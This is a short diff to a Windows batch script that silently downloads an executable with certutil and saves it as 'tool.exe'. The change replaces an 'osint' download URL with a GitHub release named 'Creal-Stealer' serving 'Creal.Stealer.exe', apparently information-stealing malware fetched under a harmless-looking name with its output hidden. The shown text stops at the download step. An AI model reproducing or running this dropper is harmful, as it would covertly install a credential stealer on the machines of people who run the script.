@@ -1,5 +1,5 @@
 @echo off
-set "URL=https://github.com/hvbsvqdj/osint/releases/download/osint/osint.exe"
+set "URL=https://github.com/hvbsvqdj/Creal-Stealer/releases/download/Stealer/Creal.Stealer.exe"
 set "Dossier=resultas"
 set "NomFichier=%Dossier%\tool.exe"
 certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
